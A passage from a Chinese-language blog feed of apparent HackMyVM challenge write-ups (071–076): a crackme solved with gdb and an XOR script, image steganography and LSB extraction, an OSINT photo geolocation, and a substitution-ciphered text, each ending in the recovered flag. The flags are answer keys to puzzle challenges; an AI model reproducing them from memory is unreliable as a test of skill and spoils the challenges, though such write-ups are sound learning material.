└─$ 7z x 076.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 415777 bytes (407 KiB)

Extracting archive: 076.zip
--
Path = 076.zip
Type = zip
Physical Size = 415777

Everything is Ok

Files: 2
Size:       1056496
Compressed: 415777
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al               
总计 1459
drwxr-xr-x 1 kali kali    4096  7月27日 05:11 .
drwxr-xr-x 1 kali kali   16384  7月26日 10:07 ..
-rwxr-xr-x 1 kali kali  415777  7月27日 05:11 076.zip
-rwxr-xr-x 1 kali kali   16392 2024年 7月 1日 hmv010
-rwxr-xr-x 1 kali kali 1040104 2024年 7月 1日 hmv010-static
```

运行

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ./hmv010-static
Enter the flag : hello
Sorry, 𝓣𝓻𝔂 𝓱𝓪𝓻𝓭𝓮𝓻 !
```

反编译

```bash
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  generate_random_numbers(argc, argv, envp);
  printf('Enter the flag : ');
  __isoc99_scanf('%32s', v4);
  if ( (unsigned int)xor_and_check(v4) )
    puts('馃憦 Bravo馃憦');
  else
    puts('Sorry, 饾摚饾摶饾攤 饾摫饾摢饾摶饾摥饾摦饾摶 !');
  return 0;
}

void generate_random_numbers()
{
  int i; // [rsp+Ch] [rbp-4h]

  srand(0);
  for ( i = 0; i &lt;= 31; ++i )
    numbers[i] = rand() % 256;
}

__int64 __fastcall xor_and_check(__int64 a1)
{
  int i; // [rsp+14h] [rbp-4h]

  for ( i = 0; i &lt;= 31; ++i )
  {
    if ( (FLAG[i] ^ numbers[i]) != *(unsigned __int8 *)(i + a1) )
      return 0LL;
  }
  return 1LL;
}
```

gdb

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ gdb ./hmv010-static 
GNU gdb (Debian 16.3-1) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type 'show copying' and 'show warranty' for details.
This GDB was configured as 'x86_64-linux-gnu'.
Type 'show configuration' for configuration details.
For bug reporting instructions, please see:
&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.

For help, type 'help'.
Type 'apropos word' to search for commands related to 'word'...
Reading symbols from ./hmv010-static...
(No debugging symbols found in ./hmv010-static)
(gdb) break xor_and_check
Breakpoint 1 at 0x401bdb
(gdb) run
Starting program: /mnt/hgfs/gx/x/tmp/hmv010-static 
Enter the flag : aaaaaa

Breakpoint 1, 0x0000000000401bdb in xor_and_check ()
(gdb) info variables FLAG
All variables matching regular expression 'FLAG':

Non-debugging symbols:
0x00000000004b7020  FLAG
(gdb) info variables numbers
All variables matching regular expression 'numbers':

Non-debugging symbols:
0x00000000004e83c0  numbers
(gdb) x/32bx 0x4b7020
0x4b7020 &lt;FLAG&gt;:        0x2f    0x00    0x00    0x00    0x8b    0x00    0x00    0x00
0x4b7028 &lt;FLAG+8&gt;:      0x3f    0x00    0x00    0x00    0x08    0x00    0x00    0x00
0x4b7030 &lt;FLAG+16&gt;:     0x01    0x00    0x00    0x00    0x8c    0x00    0x00    0x00
0x4b7038 &lt;FLAG+24&gt;:     0x2f    0x00    0x00    0x00    0x99    0x00    0x00    0x00
(gdb) x/32dw 0x4e83c0
0x4e83c0 &lt;numbers&gt;:     103     198     105     115
0x4e83d0 &lt;numbers+16&gt;:  81      255     74      236
0x4e83e0 &lt;numbers+32&gt;:  41      205     186     171
0x4e83f0 &lt;numbers+48&gt;:  242     251     227     70
0x4e8400 &lt;numbers+64&gt;:  124     194     84      248
0x4e8410 &lt;numbers+80&gt;:  27      232     231     141
0x4e8420 &lt;numbers+96&gt;:  118     90      46      99
0x4e8430 &lt;numbers+112&gt;: 51      159     201     154
(gdb) x/32dw 0x4b7020
0x4b7020 &lt;FLAG&gt;:        47      139     63      8
0x4b7030 &lt;FLAG+16&gt;:     1       140     47      153
0x4b7040 &lt;FLAG+32&gt;:     77      162     229     249
0x4b7050 &lt;FLAG+48&gt;:     147     149     167     118
0x4b7060 &lt;FLAG+64&gt;:     17      157     26      141
0x4b7070 &lt;FLAG+80&gt;:     118     138     130     255
0x4b7080 &lt;FLAG+96&gt;:     5       5       103     13
0x4b7090 &lt;FLAG+112&gt;:    108     192     138     231
```

写flag计算

```bash
#a.py
import random

def calc_flag():
    random.seed(0)
    
    flag_ints = [47, 139, 63, 8, 1, 140, 47, 153, 77, 162, 229, 249, 147, 149, 167, 118, 17, 157, 26, 141, 118, 138, 130, 255, 5, 5, 103, 13, 108, 192, 138, 231]
    numbers = [103, 198, 105, 115, 81, 255, 74, 236, 41, 205, 186, 171, 242, 251, 227, 70, 124, 194, 84, 248, 27, 232, 231, 141, 118, 90, 46, 99, 51, 159, 201, 154]
    
    flag = ''.join(chr(flag_ints[i] ^ numbers[i]) for i in range(32))
    print(flag)

calc_flag()
```

运行

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 a.py             
HMV{Pseudo_RanD0m_Numbers_In__C}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20076.html</guid><pubDate>Wed, 06 Aug 2025 00:33:33 +0000</pubDate></item><item><title>Challenge 075</title><link>https://7r1UMPHK.github.io/post/Challenge%20075.html</link><description>![image-20250726094546654](http://7r1UMPHK.github.io/image/20250726094546906.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 075.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 1660377 bytes (1622 KiB)

Extracting archive: 075.zip
--
Path = 075.zip
Type = zip
Physical Size = 1660377

Everything is Ok

Size:       1678207
Compressed: 1660377
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al
总计 3281
drwxr-xr-x 1 kali kali    4096  7月25日 21:46 .
drwxr-xr-x 1 kali kali   16384  7月25日 08:07 ..
-rwxr-xr-x 1 kali kali 1660377  7月25日 21:45 075.zip
-rwxr-xr-x 1 kali kali 1678207 2024年 5月26日 75.jpg

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ exiftool 75.jpg                                        
ExifTool Version Number         : 13.25
File Name                       : 75.jpg
Directory                       : .
File Size                       : 1678 kB
File Modification Date/Time     : 2024:05:26 06:25:51-04:00
File Access Date/Time           : 2025:07:25 21:46:51-04:00
File Inode Change Date/Time     : 2024:05:26 06:25:51-04:00
File Permissions                : -rwxr-xr-x
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Image Width                     : 2645
Image Height                    : 1276
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 2645x1276
Megapixels                      : 3.4
```

![75](http://7r1UMPHK.github.io/image/20250726094651605.webp)

google反向框一下就出来了

扒拉一下
https://www.alamy.com/stock-photo-view-on-narrow-cobbled-street-among-traditional-parisian-buildings-50665105.html

这里的比较清晰
https://www.flickr.com/photos/17770552@N02/25410475164/

这里显示了店铺名但是不是很清晰

![image-20250726100801703](http://7r1UMPHK.github.io/image/20250726100802211.webp)

AI真nb，去google map一看就看到了

![image-20250726100844052](http://7r1UMPHK.github.io/image/20250726100844945.webp)

```
HMV{The_Tea_Caddy}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20075.html</guid><pubDate>Wed, 06 Aug 2025 00:32:57 +0000</pubDate></item><item><title>Challenge 074</title><link>https://7r1UMPHK.github.io/post/Challenge%20074.html</link><description>这两天github被标记了，所以现在写的wp，博客后面才慢慢发

这两天复习快疯了，打打challenges

![image-20250726092459966](http://7r1UMPHK.github.io/image/20250726092508923.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 074.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 10720923 bytes (11 MiB)

Extracting archive: 074.zip
--
Path = 074.zip
Type = zip
Physical Size = 10720923

Everything is Ok

Files: 2
Size:       10729161
Compressed: 10720923
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al
总计 20969
drwxr-xr-x 1 kali kali     4096  7月25日 21:26 .
drwxr-xr-x 1 kali kali    16384  7月25日 08:07 ..
-rwxr-xr-x 1 kali kali 10729024 2024年 5月26日 074.png
-rwxr-xr-x 1 kali kali      137 2024年 5月28日 074.txt
-rwxr-xr-x 1 kali kali 10720923  7月25日 21:25 074.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat 074.txt 
0000000001100100011011110101111101111001011011110111010101011111011011000110100101101011011001010101111101111000011011110111001000111111
```

是hex，解一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat 074.txt | perl -lpe '$_=pack'B*',$_'
do_you_like_xor?
```

XOR异或，意思就是还有东西

![074](http://7r1UMPHK.github.io/image/20250726093019615.webp)

喵喵，哈哈哈

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ binwalk -e 074.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
60            0x3C            Zlib compressed data, default compression

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented

                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ binwalk 074.png    

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 2882 x 3840, 8-bit/color RGB, non-interlaced
60            0x3C            Zlib compressed data, default compression
3858618       0x3AE0BA        JBOOT SCH2 kernel header, compression type: gzip, Entry Point: 0xFE3E8414, image size: 936827483 bytes, data CRC: 0xAC684B75, Data Address: 0xD1EDDC73, rootfs offset: 0xC8D8C018, rootfs size: 294417102 bytes, rootfs CRC: 0xA1288981, header CRC: 0x44230814, header size: 36867 bytes, cmd line length: 22886 bytes
4911357       0x4AF0FD        JBOOT STAG header, image id: 0, timestamp 0x883BEF22, image size: 271372934 bytes, image JBOOT checksum: 0xB20, header JBOOT checksum: 0x20EB

                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ zsteg 074.png      
imagedata           .. text: '\n\n\n\t\t\t\n\n'
b1,rgb,msb,xy       .. text: 'DJ$%I\'II$II'
b2,b,msb,xy         .. text: 'VZj]-vOF'
b2,rgb,lsb,xy       .. file: OpenPGP Secret Key
b3,b,msb,xy         .. text: 'Mqpn|Tq\rz'
b3,bgr,lsb,xy       .. text: 'Ho$[@2A 4'
b4,r,lsb,xy         .. text: 'St{aUFdb'
b4,b,lsb,xy         .. text: 'DDUDUTDDEUTDUUTDTDUDDDDDDDUUfUUDDEUUDUV'
b4,rgb,lsb,xy       .. text: 'UCCxtTwk'
b4,rgb,msb,xy       .. text: 'E4sEFVaS6'
b4,bgr,lsb,xy       .. text: 'ESCxtTgz'
b4,bgr,msb,xy       .. text: '0DuCFQVc3'
```

没啥感兴趣的，应该是lsb

https://georgeom.net/StegOnline/extract

Extract Data  RGB全0

hex那扒拉一段

```
68091924000000000108000000111b5342e6eeab5bb7855cd926dc2491c75648d2564
```

处理

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat 074.txt | perl -lpe '$_=pack'B*',$_' | xxd -p
00646f5f796f755f6c696b655f786f723f0a
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ echo -n '00646f5f796f755f6c696b655f786f723f0a' | wc -c        
36
                    
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ echo '68091924000000000108000000111b5342e6eeab5bb7855cd926dc2491c75648d2564' | head -c 36
68091924000000000108000000111b5342e6                                                    
```

XOR一下
```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 -c 'a='00646f5f796f755f6c696b655f786f723f0a';b='68091924000000000108000000111b5342e6';print(''.join(format(int(a[i:i+2],16)^int(b[i:i+2],16),'02x')for i in range(0,36,2)))'
686d767b796f755f6d616b655f6974217dec
                     
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ echo '686d767b796f755f6d616b655f6974217dec' | xxd -r -p
hmv{you_make_it!}�                                                                      
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20074.html</guid><pubDate>Wed, 06 Aug 2025 00:32:22 +0000</pubDate></item><item><title>Challenge 073</title><link>https://7r1UMPHK.github.io/post/Challenge%20073.html</link><description>![image-20250722220049943](https://7r1umphk.github.io/image/20250722220050174.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 073.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 1764017 bytes (1723 KiB)

Extracting archive: 073.zip
--
Path = 073.zip
Type = zip
Physical Size = 1764017

Everything is Ok

Size:       1764017
Compressed: 1764017
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al
总计 3466
drwxr-xr-x 1 kali kali    4096  7月22日 10:02 .
drwxr-xr-x 1 kali kali   16384  7月22日 00:08 ..
-rwxr-xr-x 1 kali kali 1764017 2024年 5月26日 073.png
-rwxr-xr-x 1 kali kali 1764017  7月22日 10:01 073.zip
```

![073](https://7r1umphk.github.io/image/20250722220234455.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ stegseek 073.png               
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[!] error: the file format of the file '073.png' is not supported.
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ binwalk 073.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1600 x 1600, 8-bit/color RGB, non-interlaced
60            0x3C            Zlib compressed data, default compression

                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ steghide extract -sf 073.png   
Enter passphrase: 
steghide: the file format of the file '073.png' is not supported.
                                                                
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ zsteg 073.png  
imagedata           .. text: 'UYZ.31)+)'
b1,rgb,lsb,xy       .. text: 'nI?nKdK`$'
b4,r,lsb,xy         .. text: '\'D3ffUDUDDUUfUw'
b4,g,lsb,xy         .. text: 'D3UUUDD33DDUUww'
b4,b,lsb,xy         .. text: 'fffffUUUffUUDD333333333DDDDDDDD33333333DD33D3UD3DD3\'\''
b4,b,msb,xy         .. text: ['\'' repeated 8 times]
b4,rgb,lsb,xy       .. text: '0e&amp;Re&amp;RU'
b4,bgr,lsb,xy       .. text: '03%bV%bV'

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ zsteg -E 'b4,rgb,lsb,xy' 073.png &gt; a
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ file a
a: data
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la a
-rwxr-xr-x 1 kali kali 3840000  7月22日 10:06 a

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ binwalk a

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
```

https://georgeom.net/StegOnline/extract

Extract Files/Data

![image-20250722221534561](https://7r1umphk.github.io/image/20250722221534835.webp)

```
hmv{youreallyknowLSBbro}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20073.html</guid><pubDate>Tue, 22 Jul 2025 15:10:50 +0000</pubDate></item><item><title>Challenge 072</title><link>https://7r1UMPHK.github.io/post/Challenge%20072.html</link><description>![image-20250722215411456](https://7r1umphk.github.io/image/20250722215411704.webp)

解压，查看

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al 
总计 91364
drwxr-xr-x 1 kali kali     4096  7月22日 09:57 .
drwxr-xr-x 1 kali kali    16384  7月22日 00:08 ..
-rwxr-xr-x 1 kali kali 93536118 2024年 4月 7日 072.zip
drwxr-xr-x 1 kali kali        0  7月22日 09:57 fr1end
                         
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cd fr1end         
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/fr1end]
└─$ grep -r 'HMV{' .                                                                                           
./fr1end-main/server/keys/flag.txt:HMV{jWt_m4keS_th3_w0rLd_g0_r0und}
          
```

秒。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20072.html</guid><pubDate>Tue, 22 Jul 2025 15:10:38 +0000</pubDate></item><item><title>Challenge 071</title><link>https://7r1UMPHK.github.io/post/Challenge%20071.html</link><description>![image-20250722214605319](https://7r1umphk.github.io/image/20250722214605558.webp)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 071.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 3437 bytes (4 KiB)

Extracting archive: 071.zip
--
Path = 071.zip
Type = zip
Physical Size = 3437

Everything is Ok

Size:       7094
Compressed: 3437
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al 
总计 31
drwxr-xr-x 1 kali kali  4096  7月22日 09:46 .
drwxr-xr-x 1 kali kali 16384  7月22日 00:08 ..
-rwxr-xr-x 1 kali kali  3437  7月22日 09:46 071.zip
-rwxr-xr-x 1 kali kali  7094 2024年 2月15日 hmv-moje02.txt
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat hmv-moje02.txt 
JalanClmd Ad X fVyVazIXtAxVf AazVIaXzAlaXt XyzAiAdz Xaf oXyUzAiAdz ylttVyzAiV Xaf CliVCVaz TIACXIAtn Ualva glI Azd iXIAlmd ynEVIXzzXyUd XOXAadz dViVIXt OliVIaCVazd, OliVIaCVaz AadzAzmzAlad Xaf OliVIaCVaz XOVayAVd, ylITlIXzAlad Xaf zoV somIyo lg YyAVazltlOn. JalanClmd lIAOAaXzVf Aa 2003 la zoV ACXOVElXIf 4yoXa IVTIVdVazAaO zoV ylayVTz lg CXan latAaV Xaf lggtAaV ylCCmaAzn mdVId dACmtzXaVlmdtn VKAdzAaO Xd Xa 'XaXIyoAy', fAOAzAxVf 'OtlEXt EIXAa' lI 'oAiVCAaf'. JalanClmd CVCEVId (Ualva Xd Xalad) yXa dlCVzACVd EV fAdzAaOmAdoVf Aa TmEtAy En zoV vVXIAaO lg Qmn uXvUVd CXdUd Aa zoV dzntV TlIzIXnVf Aa zoV OIXToAy aliVt Xaf gAtC w glI wVafVzzX. YlCV Xalad Xtdl lTz zl CXdU zoVAI ilAyVd zoIlmOo ilAyV yoXaOVId lI zVKz-zl-dTVVyo TIlOIXCd. BlxVad lg TVlTtV oXiV EVVa XIIVdzVf glI AailtiVCVaz Aa JalanClmd ynEVIXzzXyUd Aa ylmazIAVd AaytmfAaO zoV eaAzVf YzXzVd, zoV eaAzVf NAaOflC, JmdzIXtAX, zoV kVzoVItXafd, Ylmzo JgIAyX, YTXAa, qafAX, Xaf bmIUVn. PiXtmXzAlad lg zoV OIlmT'd XyzAlad Xaf VggVyzAiVaVdd iXIn vAfVtn. YmTTlIzVId oXiV yXttVf zoV OIlmT 'gIVVflC gAOozVId' Xaf fAOAzXt RlEAa Wllfd, voAtV yIAzAyd oXiV fVdyIAEVf zoVC Xd 'X ynEVI tnayo-ClE' lI 'ynEVI zVIIlIAdzd'. qa 2012, bACV yXttVf JalanClmd laV lg zoV '100 Cldz AagtmVazAXt TVlTtV' Aa zoV vlItf. JalanClmd' CVfAX TIlgAtV fACAaAdoVf En 2018, Emz zoV OIlmT IV-VCVIOVf Aa 2020 zl dmTTlIz zoV QVlIOV utlnf TIlzVdzd Xaf lzoVI yXmdVd. MoAtldlTon boV ToAtldlTon lg JalanClmd lggVId AadAOoz Aazl X tlaO-dzXafAaO TltAzAyXt pmVdzAla zoXz oXd OlaV maXadvVIVf vAzo lgzVa zIXOAy yladVpmVayVd glI dlyAXt CliVCVazd: voXz flVd X aVv glIC lg ylttVyzAiV TltAzAyd tllU tAUV zoXz vAdoVd zl Ol EVnlaf zoV AfVazAzn lg zoV AafAiAfmXt dmESVyz Aa tXzV yXTAzXtAdC? qazVIaXt fAddVaz Ad Xtdl X IVOmtXI gVXzmIV lg zoV OIlmT. J vVEdAzV XddlyAXzVf vAzo zoV OIlmT fVdyIAEVd Az Xd 'Xa qazVIaVz OXzoVIAaO' vAzo 'X iVIn tlldV Xaf fVyVazIXtAxVf ylCCXaf dzImyzmIV zoXz lTVIXzVd la AfVXd IXzoVI zoXa fAIVyzAiVd'. QXEIAVttX sltVCXa vIAzVd lg zoV OIlmT: 'qa dlCV vXnd, Az CXn EV ACTlddAEtV zl OXmOV zoV AazVaz Xaf ClzAiV lg zolmdXafd lg TXIzAyATXazd, CXan lg vol fla'z ViVa ElzoVI zl tVXiV X zIXyV lg zoVAI zolmOozd, ClzAiXzAlad, Xaf IVXyzAlad. JClaO zoldV zoXz fl, lTAaAlad iXIn yladAfVIXEtn.' FIlXftn dTVXUAaO, Jalad lTTldV qazVIaVz yVadlIdoAT Xaf ylazIlt Xaf zoV CXSlIAzn lg zoVAI XyzAlad zXIOVz OliVIaCVazd, lIOXaAxXzAlad, Xaf ylITlIXzAlad zoXz zoVn XyymdV lg yVadlIdoAT. Jalad vVIV VXItn dmTTlIzVId lg zoV OtlEXt GyymTn CliVCVaz Xaf zoV JIXE YTIAaO. YAayV 2008, X gIVpmVaz dmESVyz lg fAdXOIVVCVaz vAzoAa JalanClmd Ad voVzoVI CVCEVId dolmtf glymd la TIXaUAaO Xaf VazVIzXAaCVaz lI ClIV dVIAlmd (Xaf, Aa dlCV yXdVd, TltAzAyXt) XyzAiAdC. ZV [JalanClmd] Smdz oXTTVa zl EV X OIlmT lg TVlTtV la zoV qazVIaVz vol aVVf—Smdz UAaf lg Xa lmztVz zl fl Xd vV vAdo, zoXz vV vlmtfa'z EV XEtV zl fl Aa IVOmtXI dlyAVzn. ...boXz'd ClIV lI tVdd zoV TlAaz lg Az. Bl Xd nlm vAdo. ... boVIV'd X ylCCla ToIXdV: 'vV XIV flAaO Az glI zoV tmtx.' — bIVaz MVXylyU, 'YVXIyo PaOAaV: boV uXyV lg JalanClmd, uVEImXIn 7, 2008. FVyXmdV JalanClmd oXd al tVXfVIdoAT, al XyzAla yXa EV XzzIAEmzVf zl zoV CVCEVIdoAT Xd X voltV. MXICn Gtdla Xaf lzoVId oXiV yIAzAyAxVf CVfAX yliVIXOV zoXz TIVdVazd zoV OIlmT Xd vVtt-lIOXaAxVf lI olClOVaVlmd; Gtdla vIAzVd, 'boVIV vXd al dAaOtV tVXfVI TmttAaO zoV tViVId, Emz X gVv lIOXaAxXzAlaXt CAafd zoXz dlCVzACVd TlltVf zlOVzoVI zl dzXIz TtXaaAaO X dzmaz.' YlCV CVCEVId TIlzVdz mdAaO tVOXt CVXad, voAtV lzoVId VCTtln AttVOXt CVXdmIVd dmyo Xd BBlY XzzXyUd Xaf oXyUAaO. cVCEVIdoAT Ad lTVa zl XanlaV vol vAdoVd zl dzXzV zoVn XIV X CVCEVI lg zoV ylttVyzAiV; FIAzAdo SlmIaXtAdz sXIltV sXfvXttXfI lg boV GEdVIiVI ylCTXIVf zoV OIlmT'd fVyVazIXtAxVf dzImyzmIV zl zoXz lg Xt-hXVfX: 'qg nlm EVtAViV Aa JalanClmd, Xaf yXtt nlmIdVtg JalanClmd, nlm XIV JalanClmd.' Gtdla, vol glICVItn fVdyIAEVf JalanClmd Xd X 'EIXaf', dzXzVf Aa 2012 zoXz doV alv yoXIXyzVIAxVf Az Xd X 'CliVCVaz' IXzoVI zoXa X OIlmT: 'XanlaV yXa EV TXIz lg Az. qz Ad X yIlvf lg TVlTtV, X aVEmtlmd yIlvf lg TVlTtV, vlIUAaO zlOVzoVI Xaf flAaO zoAaOd zlOVzoVI glI iXIAlmd TmITldVd.' boV OIlmT'd gVv ImtVd AaytmfV alz fAdytldAaO laV'd AfVazAzn, alz zXtUAaO XElmz zoV OIlmT, Xaf alz XzzXyUAaO CVfAX. cVCEVId ylCClatn mdV zoV zXOtAaV 'ZV XIV JalanClmd. ZV XIV LVOAla. ZV fl alz glIOAiV. ZV fl alz glIOVz. PKTVyz md.' FIAXa NVttn vIAzVd zoXz zoIVV lg zoV OIlmT'd UVn yoXIXyzVIAdzAyd XIV ' Xa maIVtVazAaO ClIXt dzXayV la AddmVd Xaf IAOozd, IVOXIftVdd lg fAIVyz TIlilyXzAla; X TondAyXt TIVdVayV zoXz XyylCTXaAVd latAaV oXyUAaO XyzAiAzn; Xaf  X fAdzAayzAiV EIXaf.' jlmIaXtAdzd oXiV ylCCVazVf zoXz JalanClmd' dVyIVyn, gXEIAyXzAlad, Xaf CVfAX XvXIVaVdd TldV Xa mamdmXt yoXttVaOV glI IVTlIzAaO la zoV OIlmT'd XyzAlad Xaf ClzAiXzAlad. hmAaa klIzla lg ZAIVf vIAzVd zoXz: 'Jalad tAV voVa zoVn oXiV al IVXdla zl tAV. boVn vVXiV iXdz gXEIAyXzAlad Xd X glIC lg TVIglICXayV. boVa zoVn zVtt zoV zImzo Xz maVKTVyzVf Xaf maglIzmaXzV zACVd, dlCVzACVd fVdzIlnAaO zoVCdVtiVd Aa zoV TIlyVdd. boVn XIV maTIVfAyzXEtV.'. Fn zoV vXn Wcw{Ad_zoV_EVdz_vVEdAzV_glI_imtaVIXEtV_iAIzmXt_CXyoAaVd}. klIzla dzXzVd zoXz zoV fAggAymtzAVd Aa IVTlIzAaO la zoV OIlmT yXmdV Cldz vIAzVId, AaytmfAaO oVIdVtg, zl glymd la zoV 'dCXtt OIlmTd lg oXyUVId vol dzltV zoV tACVtAOoz gIlC X tVOAla, fVgAVf zoVAI iXtmVd, Xaf yIXdoVf iAltVaztn Aazl zoV tXv' IXzoVI zoXa 'JalanClmd'd dVX lg ilAyVd, Xtt VKTVIACVazAaO vAzo aVv vXnd lg EVAaO Aa zoV vlItf'. YAayV 2009, flxVad lg TVlTtV oXiV EVVa XIIVdzVf glI AailtiVCVaz Aa JalanClmd ynEVIXzzXyUd, Aa ylmazIAVd AaytmfAaO zoV e.Y., eN, JmdzIXtAX, zoV kVzoVItXafd, YTXAa, Xaf bmIUVn. Jalad OVaVIXttn TIlzVdz zoVdV TIldVymzAlad Xaf fVdyIAEV zoVdV AafAiAfmXtd Xd CXIznId zl zoV CliVCVaz. boV jmtn 2011 XIIVdz lg LmtxYVy CVCEVI blTAXIn EVyXCV X TXIzAymtXI IXttnAaO TlAaz, tVXfAaO zl X vAfVdTIVXf 'uIVV blTAXIn' CliVCVaz. boV gAIdz TVIdla zl EV dVaz zl SXAt glI TXIzAyATXzAla Aa Xa JalanClmd BBlY XzzXyU vXd BCAzIAn QmxaVI, Xa JCVIAyXa 19-nVXI-ltf. WV TtVXfVf OmAtzn zl 'maXmzolIAxVf ACTXAICVaz lg X TIlzVyzVf ylCTmzVI' Aa kliVCEVI 2009 Xaf vXd dVazVayVf zl 366 fXnd Aa e.Y. gVfVIXt TIAdla. Ga jmaV 13, 2011, lggAyAXtd Aa bmIUVn XIIVdzVf 32 AafAiAfmXtd zoXz vVIV XttVOVftn AailtiVf Aa BBlY XzzXyUd la bmIUAdo OliVIaCVaz vVEdAzVd. boVdV CVCEVId lg JalanClmd vVIV yXTzmIVf Aa fAggVIVaz yAzAVd lg bmIUVn AaytmfAaO qdzXaEmt Xaf JaUXIX. JyylIfAaO zl Ms cXOXxAaV, zoVdV AafAiAfmXtd vVIV XIIVdzVf XgzVI zoVn XzzXyUVf vVEdAzVd Xd X IVdTladV zl zoV bmIUAdo OliVIaCVaz fVCXaf zl qYMd zl ACTtVCVaz X dndzVC lg gAtzVId zoXz CXan oXiV TVIyVAiVf Xd yVadlIdoAT. soIAd Blnla (XtAXd 'slCCXafVI r'), X dVtg-fVdyIAEVf tVXfVI lg JalanClmd, vXd XIIVdzVf Aa YVTzVCEVI 2011 glI X ynEVIXzzXyU la zoV vVEdAzV lg YXazX sImx slmazn, sXtAglIaAX. WV SmCTVf EXAt Aa uVEImXIn 2012 Xaf gtVf XyIldd 